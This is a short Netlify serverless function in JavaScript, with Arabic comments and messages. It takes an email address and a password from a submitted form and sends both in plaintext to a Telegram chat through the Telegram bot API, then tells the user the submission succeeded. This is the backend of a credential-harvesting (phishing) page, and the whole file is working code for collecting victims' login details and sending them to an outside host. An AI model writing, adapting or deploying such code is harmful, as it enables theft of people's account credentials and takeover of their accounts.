// netlify/functions/sendData.js
exports.handler = async function(event, context) {
  try {
    const data = JSON.parse(event.body);
    const email = data.email;
    const password = data.password;

    // متغيرات البيئة
    const TOKEN = process.env.TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const fetch = (await import("node-fetch")).default;

    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `📩 تسجيل جديد:\n\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}`
      })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "✅ تم إرسال البيانات بنجاح!" }),
    };

  } catch (err) {
    console.error(err);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "❌ خطأ في المعالجة." }),
    };
  }
};
